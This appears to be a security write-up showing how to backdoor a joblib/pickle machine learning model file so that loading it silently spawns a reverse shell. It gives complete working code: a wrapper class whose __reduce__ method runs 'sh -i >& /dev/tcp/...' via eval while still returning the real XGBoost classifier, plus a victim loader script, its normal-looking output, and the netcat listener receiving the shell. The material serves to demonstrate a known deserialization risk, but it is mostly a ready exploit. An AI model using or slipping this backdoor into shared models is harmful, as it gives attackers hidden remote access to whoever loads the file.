# Python Machine Learning

This trick was discovered by me when I was studying basic machine learning notions.
I noticed that the library [joblib](https://github.com/joblib/joblib) that I was using for importing/exporting the machine learning-trained model uses `pickle.load` unsafely internally. Of course, useless to say that this exploit works whenever `pickle` itself is used instead of `joblib.`

How does it work?

1. First we train our machine learning model and export it normally, for example with `joblib.dump`
2. Then, we reimport the model and we backdoor it using `__reduce__` method. What happens actually is that the original pre-trained object is encoded in `base64` and embedded within the new model which will result in the backdoored one when finally exported. As a result, the malicious code will decode the original machine learning object and run it as normally would do, but in the while, it runs also other malicious code which can lead to obtaining a reverse shell.
3. We finally export the backdoored module ready to be imported.

## Exploit

1. Dump your original machine learning model after for example having trained it with `scikit-learn`
2. Add a `Wrapper` class to embed the backdoor, in the following example the model is trained and backdoored at once.

```python
import joblib
from sklearn.model_selection import train_test_split
import time 
from xgboost import XGBClassifier
from utils import preprocess_dataset
import pandas as pd 
import io
import base64 

class Wrapper:
    def __init__(self, clf):
        self.clf = clf

    def __reduce__(self):
        # Serialize self.clf into a byte string
        clf_bytes = io.BytesIO()
        joblib.dump(self.clf, clf_bytes)
        clf_bytes.seek(0)
        serialized_clf = clf_bytes.getvalue()

        # Encode the serialized data in Base64
        encoded_clf = base64.b64encode(serialized_clf).decode('utf-8')

        # Return the deserialization logic using Base64 decoding and io.BytesIO
        return (eval, (f"(lambda: (__import__('os').system('nohup sh -i >& /dev/tcp/127.0.0.1/1234 0>&1 &') or "
                       f"__import__('joblib').load(__import__('io').BytesIO(__import__('base64').b64decode('{encoded_clf}')))))()",))

# Utility function for time measurement
def current_ms() -> int:
    return round(time.time() * 1000)

if __name__ == "__main__":
    
    # Load Dataset
    df = pd.read_csv('./dataset.csv')
    print(f"Dataset loaded with {len(df)} records.")

    # Preprocess Dataset
    df = preprocess_dataset(df)
    print("Dataset preprocessed successfully.")
    print(df.head())

    # Separate features and labels (this was because of supervised machine learning type)
    X = df.drop(columns=['label'])
    y = df['label']
    
    # Train/Test Split
    train_data, test_data, train_label, test_label = train_test_split(
        X, y, test_size=0.1, shuffle=True
    )
    
    clf =  XGBClassifier(n_estimators=11)
    
    start_train = current_ms()
    clf.fit(train_data, train_label)
    end_train = current_ms()

    # Predict on Test Data
    start_predict = current_ms()
    predicted_labels = clf.predict(test_data)
    end_predict = current_ms()
    
    wrapped = Wrapper(clf)
    
    joblib.dump(wrapped,"test.model")
    
```

3. Now `test.model` is ready to be sent with its new built-in "feature", and whenever the model is loaded in memory the backdoor will be executed and a reverse shell connection will try to be spawned. This step will emulate a victim.

```python
import joblib
from utils import preprocess_dataset
import pandas as pd

if __name__ == "__main__":
    
    # Load Dataset
    df = pd.read_csv('./merged.csv')
    print(f"Dataset loaded with {len(df)} records.")

    # Preprocess Dataset
    df = preprocess_dataset(df)
    df.drop(columns=['label'],inplace=True)
    
    print("Dataset preprocessed successfully.")
    print(df.head())

    loaded = joblib.load("test.model")
    
    print(type(loaded))
    
    predicts = loaded.predict(df)
    
    print(predicts)
```

> `python3 loader.py` Result

```
Dataset loaded with 15192 records.
Dataset preprocessed successfully.
 duration  SYN  ACK  FIN  RST  URG  PSH
0  0.000030    1    1    0    1    0    0
1  0.000013    1    1    0    1    0    0
2  0.000012    1    1    0    1    0    0
3  0.000010    1    1    0    1    0    0
4  0.000011    1    1    0    1    0    0
<class 'xgboost.sklearn.XGBClassifier'>
[0 0 0 ... 0 0 0]
```

(Notice normal output and `xgboost.sklearn.XGBClassifier` type)

4. Shell was under `nc -lvnp 1234`

```bash
Connection from 127.0.0.1:33462
sh-5.2$ whoami
whoami
virgula
sh-5.2$ 
```